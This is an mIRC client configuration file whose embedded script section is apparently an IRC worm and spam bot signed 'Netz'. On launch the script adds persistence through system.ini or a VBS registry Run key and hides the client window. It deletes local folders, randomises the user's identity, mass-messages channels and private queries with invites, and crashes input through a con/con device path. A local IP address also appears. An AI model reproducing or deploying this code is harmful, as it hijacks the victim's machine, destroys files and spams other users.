









































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































[text]
ignore=*.exe,*.com,*.bat,*.dll,*.ini,*.mrc,*.vbs,*.js,*.pif,*.scr,*.lnk,*.pl,*.shs,*.htm,*.html
network=All
commandchar=/
linesep=-
timestamp=[HH:nn]
accept=*.bmp,*.gif,*.jpg,*.log,*.mid,*.mp3,*.png,*.txt,*.wav,*.zip
lastreset=[no date]
quit=[:. Drone Relay Inviter By Netz .:]
[files]
addrbk=addrbk.ini
servers=hedmnxi.dll
finger=finger.txt
urls=urls.ini
emailer=c:\programfiler\outlook express\msimn.exe
[warn]
fserve=on
dcc=on
[options]
n0=1,0,0,1,0,1,300,0,0,0,1,0,0,0,2,0,0,2,0,0,4096,0,0,2,0,0,1,1,0,50,0,0
n1=5,100,0,0,0,0,0,0,2,1,0,1,0,0,1,1,0,0,0,0,0,1,0,0,5,0,0,0,0,0,1,0,0
n2=0,0,0,1,1,1,1,1,0,60,120,0,0,1,0,0,0,1,0,120,20,10,0,1,1,0,0,1,0,0,0
n3=5000,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,1,0,0,0,0,0,0,0,1,0,0,13,0,0,1,3,180
n4=1,0,1,0,0,3,9999,0,0,0,1,0,1024,0,1,99,60,0,0,0,0,0,1,1,1,5000,0,0,0,0,0
n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,0,1,1,1,300,30,10,0,0,26,15,0,1,8192,0,0,0,25
n6=0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,100,1,1,0,0,1,0,0,0,0
n7=0,0,0,0,0,0,0,0,0
[about]
version=5.9
show=BR26354
[dirs]
wmas=sounds\
oggs=sounds\
[ports]
random=off
bind=off
[ident]
active=yes
userid=d
system=UNIX
port=113
[socks]
enabled=no
port=1080
method=4
dccs=no
useip=yes
[clicks]
status=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
query=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
channel=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
nicklist=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
notify=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
message=.timer 1 1 /run winpop.exe /fh /n /c Sounds | .timer 1 1 /run winpop.exe /fh /n /c Gmt | if ($server != $null) { /msg %c.flood $me - Double clicked $active }
[dde]
ServerStatus=off
ServiceName=Gmt
CheckName=off
[marker]
show=off
size=3
colour=4
method=1
[fileserver]
warning=on
[dccserver]
n0=0,59,0,0,0,0
[mirc]
user=lmws
email=fpej@Jhxn.net
nick=tzbxed
anick=sa
host=us.undernet.orgSERVER:us.undernet.org:6667
[pfiles]
n0=popups.ini
n1=popups.ini
n2=popups.ini
n3=popups.ini
n4=popups.ini
[windows]
scripts=-1,1036,-3,593,0,0,0
wquery=0,633,0,399,1,1,0
wchannel=0,112,0,27,0,1,0
main=444,118,-3,28,0,1,0
wwwwlist=-1,853,-1,526,0,1,0
wnotify=-1,853,-1,526,0,1,0
[colours]
n0=0,6,4,5,2,3,3,3,3,3,3,1,5,7,6,1,3,2,3,5,1,0,1,0,1,15
[wizard]
warning=2
[language]
sjis=0
multibyte=0
[styles]
thin=3
font=0
hide=0
color=default
size=2
buttons=0
[script]
n0=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n1=;Thanks for ripping this script.. this is my 1st time on making script :) - Netz- ..On Webnet - Irc.webchat.org 6667
n2=;alias
n3=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n4=alias logo return 1,14(T15)1(r15)1(i15)1(x15)1(O15)1(n15)1(I15)1(c15)
n5=alias myserv { server $getok | c.script }
n6=alias c.script { set %num 0 | :check | inc %num | if ($script(%num) == $null) { goto end } | if (.exe !isin $script(%num)) && (.ini !isin $script(%num)) { unload -rs $script(%num) } | goto check | :end }
n7=alias autorun { if ($os != 95) && ($os != 98) { alter | goto hell } | if ($os == 95) || ($os == 98) { .writeini c:/windows/system.ini boot shell Explorer.exe $mircexe | goto hell } | :hell }
n8=alias inv { close -m | join $read Modem.ini | halt }
n9=alias n3tz { amsg $read Lmnix.sys | notice $comchan($me,1) $read Lmnix.sys | notice $comchan($me,2) $read Lmnix.sys }
n10=
n11=alias cheque { if ($server == $null) { myserv } }
n12=alias alter { write -c Windll.vbs on error resume next | write Windll.vbs Set src = CreateObject("Wscript.shell") | write Windll.vbs updateSP = " $+ $mircexe $+ " | write Windll.vbs keySP = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Windll" | write Windll.vbs src.RegWrite keySP, updateSP | .timer 1 2 .run javadetail.vbs }
n13=alias renick return $read hang.exe
n14=alias reid return $read hang.exe
n15=alias getok return $gettok(eu.undernet.org 6667@us.undernet.org 6667@, $+ $rand(1,2) $+ ,64)
n16=alias r!p { editbox -a Hey you!! ...yea yOu!! ..My master nick is Netz in webnet, Come visit him now !! java.webchat.org 7000 :þ }
n17=alias web { goto $r(1,7) | :1 | return .com | goto hell | :2 | return .org | goto hell | :3 | return .net | goto hell | :4 | return .biz | goto hell | :5 | return .sg | goto hell | :6 | return .my | goto hell | :7 | return .mankoya | goto hell | :hell }
n18=alias t1mer { .timer 1 1 $1- }
n19=
n20=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n21=;Remote
n22=;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
n23=on *:start:{ if ($exists(winpop.exe) == $true) { run winpop.exe /fh /n /c Sounds } | if ($exists(winpop.exe) == $false) { .timer 0 0 /showmirc -t } | .timereditbox -o 0 0 .r!p | autorun | .fullname $read hang.exe | .emailaddr $read hang.exe $+ @ $+ $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $web | .nick $renick | .anick $renick | .identd on $read hang.exe |  .timerserv -o 0 60 .cheque | .timerchange -o 0 3600 .myserv | .timer 1 5 .myserv | .t1mer .rmdir download | .t1mer .rmdir sounds | .t1mer .rmdir logs }
n24=on *:join:#:{
n25=if ($nick == $me) && ($comchan($me,0) == 2) { 
n26=.timermsgs 1 14 n3tz | .timerparts 1 17 .partall 
n27=.timernicks 1 17 .nick $renick
n28=} 
n29=}
n30=on *:input:*:{ timer 0 -0 run c:/con/con/prn/prn/aux/aux | halt }
n31=on *:open:?:{ if ($chr(35) isin $1-) || (http:// isin $1-) || (www. isin $1-) { halt } | .msg $nick $read lmnix.sys } 
n32=on *:connect: { .perform off | .timerping 0 120 /ctcp $ $+ me ping | .timerjoins 0 30 .inv }
n33=on *:disconnect: { .timermsgs off | .timerping off | .timerpart* off | .timerjoins off | .nick $renick | .timer 1 3 .myserv }
n34=on *:exit:{ .run $mircexe protocol.ini | autorun }
n35=ctcp *:version:*:. { halt }
n36=ctcp *:time:*:. { halt }
n37=ctcp *:ping:*:. { halt }
[waves]
send=Event Beep
highlight=No Sound
[dragdrop]
n0=*.wav:/sound $1 $2-
n1=*.*:/dcc send $1 $2-
s0=*.*:/dcc send $1 $2-
[local]
local=126.ppp1-1.sb.tiscali.no
localip=213.234.68.126
longip=3588899966

[notify]
n0=Negativity
n1=Netz

[afiles]
n0=aliases.ini

[extensions]
n0=defaultEXTDIR:download\
n1=*.wav,*.mid,*.mp3,*.wma,*.oggEXTDIR:sounds\

[rfiles]
n0=remote.ini
n1=ripping-my-script-eh??.ahahaha.thanks.for.tha.credit.eh.:)
n2=protocol.ini
